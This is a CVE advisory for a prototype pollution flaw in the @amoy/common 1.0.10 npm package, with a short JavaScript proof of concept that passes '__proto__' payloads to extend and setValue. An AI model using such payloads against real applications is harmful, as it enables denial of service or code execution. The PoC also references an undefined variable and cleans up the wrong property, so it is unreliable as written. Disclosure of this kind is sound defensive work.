[CVE-2024-38994] Vulnerability Advisory: Prototype Pollution in @amoy/common, version 1.0.10

 [Raw](/mestrtee/02091aa86c6c14c29b9703642439dd03/raw/d81c7e6d4f3b0d4557376ef2c07aa08fb8e91e25/Advisory_amoyjs.md)

[**Advisory\_amoyjs.md**](#file-advisory_amoyjs-md)

**Vulnerability type:**
Prototype Pollution

**SVSS Score**
7.3 HIGH

**Vendor of the Package:**
amoyjs

**Affected Package:**

* Product: @amoy/common
* Version: 1.0.10

**Affected component(s):**

```
extend, setValue
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `extend, setValue` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `extend, setValue`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('@amoy/common');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.extend (emptyObj, JSON.parse('{"__proto__":{"test":123}}'))
lib.setValue (emptyObj, "__proto__.test", 123)

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
